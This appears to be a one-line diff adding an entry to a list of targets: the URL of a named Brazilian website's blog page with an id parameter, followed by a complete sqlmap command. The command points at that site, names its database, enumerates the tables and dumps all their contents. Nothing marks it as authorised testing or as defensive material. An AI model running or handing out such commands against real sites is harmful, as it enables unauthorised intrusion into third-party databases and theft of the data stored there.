@@ -1,0 +1,1 @@
+http://www.centermassas.com.br/blog/posts/?id_postagem=3 (GET)  # sqlmap.py -u http://www.centermassas.com.br/blog/posts/?id_postagem=3 -D centermassas --threads 5 -v3 --random-agent --tables --dump-all
